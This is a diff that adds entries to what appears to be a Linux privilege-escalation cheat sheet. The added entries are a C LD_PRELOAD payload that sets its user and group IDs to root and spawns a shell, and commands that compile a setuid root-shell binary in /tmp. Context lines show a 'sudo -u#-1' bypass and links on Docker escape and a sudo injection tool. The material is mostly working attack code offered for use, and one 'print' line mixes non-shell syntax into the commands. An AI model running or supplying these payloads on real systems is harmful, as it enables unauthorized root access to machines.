@@ -438,3 +438,28 @@ sudo -u#-1 /bin/bash
 
 ### [Escaping Docker Container]
 https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1
+
+### [Creating a LD_PRELOAD and suid bin]
+
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setgid(0);
+	setuid(0);
+	system("/bin/sh");
+}
+
+
+
+print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
+gcc -o /tmp/suid /tmp/suid.c  
+sudo chmod +x /tmp/suid
+sudo chmod +s /tmp/suid
+```
+
+### [Sudo inject]
+
+https://github.com/nongiach/sudo_inject
